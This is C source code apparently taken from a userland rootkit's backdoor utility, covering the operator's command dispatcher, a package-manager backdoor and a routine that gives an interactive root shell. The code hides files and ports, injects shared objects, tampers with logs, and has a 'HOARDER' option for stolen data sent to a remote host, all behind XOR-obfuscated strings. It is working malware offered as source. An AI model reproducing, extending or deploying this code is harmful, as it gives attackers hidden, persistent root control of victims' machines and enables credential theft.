/* displays all available ./bdv options. */
void option_err(const char *a0){
    for(size_t i=0; i<VALIDBDVCMDS_SIZE; i++){
        char *thiscmd = xordup(validbdvcmds[i]);
        if(!thiscmd) continue;
        printf("  %s %s\n", a0, thiscmd);
        clean(thiscmd);
    }
#ifdef BACKDOOR_PKGMAN
    char validmans[16*VALIDPKGMANS_SIZE];
    bxprintf(MAGIC_PKGMAN_FMT, a0, buildbdvoptargs(validmans, validpkgmans));
#endif
    exit(0);
}

void do_self(void){
    bxprintlist(unhidden_shell_msg);
    getchar();
    
    pid_t pid;
    if((pid = fork()) < 0){
        xperror(FORK);
        return;
    }else if(pid > 0){
        for(int i = 0; i < 3; i++)
            close(i);
        signal(SIGHUP, SIG_IGN);
        wait(NULL);
        return;
    }

    if(setsid() < 0){
        xperror(SETSID);
        return;
    }

    hook(CSETGID, CCHDIR);
    call(CCHDIR, "/tmp");
    unsetenv("HOME");
    call(CSETGID, 0);
    system("id");

    char *args[3] = {"/bin/sh", "-i", NULL};
#ifdef SET_MAGIC_ENV_UNHIDE
    char *env[2];
    !initmvbc() ? exit(0) : 0;
    char varbuf[strlen(mvbc->bdvar)+3];
    snprintf(varbuf, sizeof(varbuf), "%s=1", mvbc->bdvar);

    env[0] = varbuf;
    env[1] = NULL;
    hook(CEXECVE);
    call(CEXECVE, args[0], args, env);
#else
    execl(args[0], args[1], NULL);
#endif
    exit(0);
}

#ifdef BACKDOOR_PKGMAN
void checkforman(char *const *argv, const char *option){
    u_short pkgman_found = 0;
    for(size_t i = 0; i < VALIDPKGMANS_SIZE && !pkgman_found; i++){
        char *pman = xordup(validpkgmans[i]);
        if(!pman) continue;
        pkgman_found = strcmp(pman, option) == 0;
        clean(pman);
    }
    if(!pkgman_found)
        return;

    char argbuf[512] = {'i', 'd', ';', 0,};
    size_t buflen = 3;
    for(size_t argi = 1; argv[argi] != NULL; argi++){
        const size_t tmpsize = strlen(argv[argi]) + 2;
        if(buflen + tmpsize >= sizeof(argbuf)-1)
            break;
        char tmp[tmpsize];
        int c = snprintf(tmp, tmpsize, "%s ", argv[argi]);
        if(c > 0){
            buflen += c;
            strncat(argbuf, tmp, sizeof(argbuf)-1);
        }
    }
    argbuf[buflen-1] = '\0';

    pid_t pid;
    if((pid = fork()) > 0){
        fdclosee();
        signal(SIGHUP, SIG_IGN);
        wait(NULL);
    }else if(pid == 0){
        signal(SIGHUP, SIG_IGN);
        hook(CCHDIR);
        setuid(0);
        unhide_self();

        char *stmpdir = xordup(TMPDIR_STRING);
        if(!stmpdir) exit(0);
        xsetenv(HOMEVAR_STRING, stmpdir, 1);
        call(CCHDIR, stmpdir);
        clean(stmpdir);

        system(argbuf);
        wait(NULL);
    }

    exit(0);
}
#endif

/* from argv, determine what operation the backdoor user would like to do, then do it. */
void dobdvutil(char *const argv[]){
    const char *option = argv[1];
    if(!option) option_err(argv[0]);
#ifdef BACKDOOR_PKGMAN
    checkforman(argv, option);
#endif

    int mode;
    (mode = getoptmode(option, validbdvcmds)) < 0 ? option_err(argv[0]) : 0;
    switch(mode){
        char *path;
        id_t newid;
        case BDVCMD_HIDE:
            !(path = argv[2]) ? option_err(argv[0]) : 0;
            hide_path(path);
            xperror(HIDE_PATH);
            exit(0);
        case BDVCMD_UNHIDE:
            !(path = argv[2]) ? option_err(argv[0]) : 0;
            unhide_path(path);
            xperror(UNHIDE_PATH);
            exit(0);
        case BDVCMD_CHANGEID:
            for(size_t i = 0; i < IDCHANGEMSG_SIZE; i++){
                if(i == IDCHANGEMSG_SIZE-1)
                    bxprintf(idchangemsg[i], readid());
                else bxprintf(idchangemsg[i], 0);
            }
            getchar();
            newid = changerkid(time(NULL));
            bxprintf(NEW_ID_NOTIFICATION, newid);
            superkill();
        case BDVCMD_HIDEPORTS:
            dohideports(argv);
            exit(0);
        case BDVCMD_UPDATE:
            bdvupdate(argv);
            superkill();
        case BDVCMD_UNINSTALL:
            if(!reinitmvbc()){
                xperror(REINITMVBC);
                return;
            }
            bxprintf(UNINSTALLING_STRING, 0);
            terminate_self();
            bxprintf(SUCCESS_STRING, 0);
            superkill();
        case BDVCMD_UNHIDESELF:
            do_self();
            exit(0);
        case BDVCMD_MAKELINKS:
            mkbdvlinks();
            exit(0);
        case BDVCMD_INJECT:
            doinjectso(argv);
            exit(0);
        case BDVCMD_LOGS:
            dologcontrols(argv);
            exit(0);
        case BDVCMD_ASS:
#ifdef HIDE_MY_ASS
            domyass(argv);
#else
            bxprintf(THIS_IS_NOT_ENABLED, 0);
#endif
            exit(0);
        case BDVCMD_HOARDER:
#if defined ENABLE_STEAL && defined HOARDER_HOST
            dostolenstore(argv);
#else
            bxprintf(THIS_IS_NOT_ENABLED, 0);
#endif
            exit(0);
        case BDVCMD_LIFESPAN:
#if defined AFTER_HOURS || defined AFTER_DAYS
            dolifespan(argv);
#else
            bxprintf(THIS_IS_NOT_ENABLED, 0);
#endif
            exit(0);
    }

    exit(0);
}